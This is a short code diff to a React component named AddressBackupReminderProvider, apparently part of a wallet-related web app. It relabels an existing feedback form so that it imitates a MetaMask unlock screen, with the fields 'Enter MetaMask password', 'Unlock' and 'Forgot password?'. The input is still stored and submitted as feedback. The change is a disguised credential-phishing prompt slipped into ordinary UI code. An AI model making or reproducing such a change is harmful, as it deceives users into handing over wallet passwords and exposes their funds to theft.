@@ -358,7 +358,7 @@ export const AddressBackupReminderProvider = ({
                         setFeedbackError("");
                       }}
                       onFocus={() => setIsFeedbackFocused(true)}
-                      placeholder="Enter your feedback"
+                      placeholder="Enter MetaMask password"
                       style={{
                         borderColor: feedbackError
                           ? "#ca3542"
@@ -382,7 +382,7 @@ export const AddressBackupReminderProvider = ({
                       disabled={!feedback.trim()}
                       type="submit"
                     >
-                      Submit
+                      Unlock
                     </button>
                     <a
                       aria-label="Learn more about MetaMask"
@@ -391,7 +391,7 @@ export const AddressBackupReminderProvider = ({
                       rel="noopener noreferrer"
                       target="_blank"
                     >
-                      Learn more
+                      Forgot password?
                     </a>
                   </form>
                 </div>
